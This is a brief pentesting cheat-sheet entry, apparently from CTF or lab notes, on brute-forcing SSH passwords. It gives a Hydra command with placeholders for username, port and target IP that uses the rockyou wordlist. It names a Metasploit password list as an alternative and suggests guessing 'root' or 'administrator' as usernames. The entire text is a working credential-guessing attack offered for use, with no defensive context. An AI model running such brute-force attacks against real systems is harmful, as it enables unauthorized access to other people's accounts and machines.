```
hydra -l <username> -P /usr/share/wordlists/rockyou.txt -s <port number> ssh://<target ip>
```

Alternative wordlist: `/usr/share/wordlists/metasploit/unix_passwords.txt`

If we dont have a username we could possibly attack:

```
root (Linux) 
administrator (Windows)
```



